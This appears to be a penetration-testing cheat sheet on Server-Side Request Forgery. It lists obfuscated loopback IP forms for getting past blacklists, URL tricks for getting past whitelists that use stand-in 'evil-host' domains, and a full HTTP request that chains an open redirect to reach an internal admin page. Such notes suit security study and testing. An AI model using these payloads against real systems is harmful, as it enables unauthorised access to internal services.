### Server-Side Request Forgery

**any url parameter try ssrf**

cause the server to make a connection to **internal-only** services within the organization's infrastructure

- **SSRF attacks against the server itself**

  alter url parameter to `http://localhost`  this may allow functions only allowed for normal user

- **SSRF attacks against other back-end systems**

  alter url parameter to `http://192.168.0.x`  using intruder to scan back-end systems that are not reachable by user *These systems often have non-routable private IP addresses*

- **SSRF with blacklist-based input filters**

  - alter ip representation to 

    ```
    hex IP
    octal IP
    127.1 
    127.0.0.1
    0177.0.0.1
    0x7f.0.0.1
    127.0.1
    127.1
    2130706433
    017700000001
    0x7f000001
    ```

    this work because of : inet_ntop, inet_pton - convert IPv4 and IPv6 addresses between binary and text form

  - Registering your own domain name that resolves to 127.0.0.1. You can use `spoofed.burpcollaborator.net` for this purpose.

  - Obfuscating blocked strings using URL encoding or case variation like encode first letter from admin

- **SSRF with whitelist-based input filters**

  - embed credentials in a URL before the hostname `https://expected-host@evil-host`
  - use the `#` character to indicate a URL fragment `https://expected-host#evil-host` or`https://expected-host#@evil-host`
  - leverage the DNS naming hierarchy `https://expected-host.evil-host`
  - URL-encode characters to confuse the URL-parsing code
  - MIX ALL ABOVE TOGETHER

- **Bypassing SSRF filters via open redirection**

  `/product/nextProduct?currentProductId=6&path=http://evil-user.net`

  returns a redirection to:

  `http://evil-user.net`

  You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:

  ```http
  POST /product/stock HTTP/1.0
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 118
  
  stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
  ```

  This SSRF exploit works because the application first validates that the supplied stockAPI URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing.